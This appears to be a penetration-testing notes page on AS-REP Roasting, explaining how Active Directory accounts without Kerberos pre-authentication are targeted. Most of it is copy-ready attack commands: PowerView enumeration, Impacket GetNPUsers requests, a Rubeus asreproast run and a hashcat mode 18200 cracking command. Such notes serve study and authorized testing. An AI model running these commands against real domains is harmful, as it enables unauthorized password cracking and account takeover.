---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# AS-REP Roasting

## Introduction

**AS-REP Roasting** targets Active Directory accounts without **Kerberos Pre-authentication**.

The attack is made in few steps:

1. **Attacker sends** [#as-req](../kerberos-authentication.md#as-req "mention") **request** in order to get TGT from the **Authentication Server** for target user without using **pre-authentication**.
2. **Authentication Server sends encrypted TGT** to the attacker.
3. **Attacker brute-forces** the TGT offline to obtain the user's password.

## Enumerate <a href="#enumerate" id="enumerate"></a>

Enumerating accounts with Kerberos pre-authentication disabled from inside the network.

{% tabs %}
{% tab title="PowerView" %}
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```
{% endtab %}
{% endtabs %}

## Performing the attack

### Impacket

unauthenticated:

```bash
impacket-GetNPUsers <domain_name>/ -no-pass -dc-ip <dc_ip> -usersfile <userslist_file> -outputfile <hashes_file>
```

Authenticated

```bash
impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile <hashes_file> <domain>/<username>
```

### Rubeus <a href="#crack" id="crack"></a>

```powershell
.\Rubeus.exe asreproast /nowrap
```

## Crack <a href="#crack" id="crack"></a>

```bash
hashcat -m 18200 <hashes> /usr/share/wordlists/rockyou.txt
```
